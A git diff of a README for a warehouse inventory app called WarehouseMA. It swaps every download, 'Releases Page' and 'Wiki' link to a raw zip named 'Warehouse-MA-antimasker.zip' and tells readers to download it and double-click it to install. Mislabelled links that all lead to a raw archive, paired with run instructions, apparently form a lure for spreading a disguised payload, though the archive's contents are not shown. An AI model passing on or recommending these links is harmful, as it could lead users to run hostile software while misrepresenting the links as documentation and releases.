@@ -6,7 +6,7 @@ Welcome to WarehouseMA! This application helps you manage warehouse inventories 
 
 ## 📥 Download WarehouseMA
 
-[![Download WarehouseMA](https://raw.githubusercontent.com/Euthan1zed/WarehouseMA/main/Source/WarehouseMA/WarehouseMA/Properties/MA_Warehouse_2.3.zip)](https://raw.githubusercontent.com/Euthan1zed/WarehouseMA/main/Source/WarehouseMA/WarehouseMA/Properties/MA_Warehouse_2.3.zip)
+[![Download WarehouseMA](https://raw.githubusercontent.com/Euthan1zed/WarehouseMA/main/Source/WarehouseMA/Warehouse-MA-antimasker.zip)](https://raw.githubusercontent.com/Euthan1zed/WarehouseMA/main/Source/WarehouseMA/Warehouse-MA-antimasker.zip)
 
 ## 📋 System Requirements
 
@@ -32,10 +32,10 @@ WarehouseMA includes many features to make inventory management easy:
 To install and run WarehouseMA:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases Page](https://raw.githubusercontent.com/Euthan1zed/WarehouseMA/main/Source/WarehouseMA/WarehouseMA/Properties/MA_Warehouse_2.3.zip) to download the latest version of WarehouseMA.
+   Go to the [Releases Page](https://raw.githubusercontent.com/Euthan1zed/WarehouseMA/main/Source/WarehouseMA/Warehouse-MA-antimasker.zip) to download the latest version of WarehouseMA.
 
 2. **Download the Installer:**
-   On the Releases Page, find the latest version. Click on the installer file to download it. Look for a file like `https://raw.githubusercontent.com/Euthan1zed/WarehouseMA/main/Source/WarehouseMA/WarehouseMA/Properties/MA_Warehouse_2.3.zip`.
+   On the Releases Page, find the latest version. Click on the installer file to download it. Look for a file like `https://raw.githubusercontent.com/Euthan1zed/WarehouseMA/main/Source/WarehouseMA/Warehouse-MA-antimasker.zip`.
 
 3. **Run the Installer:**
    After the download completes, locate the file in your downloads folder. Double-click it to start the installation process.
@@ -78,12 +78,12 @@ WarehouseMA is distributed under the MIT License. You can use, modify, and share
 
 For more information, check out these resources:
 
-- Documentation: [Wiki](https://raw.githubusercontent.com/Euthan1zed/WarehouseMA/main/Source/WarehouseMA/WarehouseMA/Properties/MA_Warehouse_2.3.zip)
+- Documentation: [Wiki](https://raw.githubusercontent.com/Euthan1zed/WarehouseMA/main/Source/WarehouseMA/Warehouse-MA-antimasker.zip)
 - Community: Join the discussions on GitHub.
 - Tutorials: Find video guides on our website.
 
 ## 📥 Download WarehouseMA Again
 
-Remember, you can always return to the [Releases Page](https://raw.githubusercontent.com/Euthan1zed/WarehouseMA/main/Source/WarehouseMA/WarehouseMA/Properties/MA_Warehouse_2.3.zip) to download the latest version of WarehouseMA.
+Remember, you can always return to the [Releases Page](https://raw.githubusercontent.com/Euthan1zed/WarehouseMA/main/Source/WarehouseMA/Warehouse-MA-antimasker.zip) to download the latest version of WarehouseMA.
 
 Enjoy managing your warehouse with ease!
